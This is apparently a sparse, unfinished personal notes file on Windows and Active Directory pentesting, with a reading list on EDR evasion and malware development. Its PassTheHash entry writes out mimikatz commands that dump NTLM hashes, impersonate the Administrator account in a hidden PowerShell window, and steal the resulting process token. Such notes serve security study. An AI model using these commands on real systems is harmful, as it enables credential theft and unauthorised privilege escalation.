# Windows Host security features

# Security in AD network

# Windows related
### Process monitoring
Useful for trackig filesystem, Process, Threads, DLL activity


# Active Directory and Windows Pentesting
### User impersonation
- **PassTheHash**    - Dump NTLM hashes ```lsadump::sam```, now Impersonate a user ```mimikatz sekurlsa::pth /user:Administrator /domain:. /ntlm:… /run:"powershell -w hidden"```, now migrate to the new created process as the impersonated user ```steal_token 1234```
- **PassTheTicket**  - ?????????????????????
- OverPassTheHash    -  


# EDR bypass and malware developement
- Evading EDR Book- https://learning.oreilly.com/library/view/evading-edr
- Grey hat GoLang
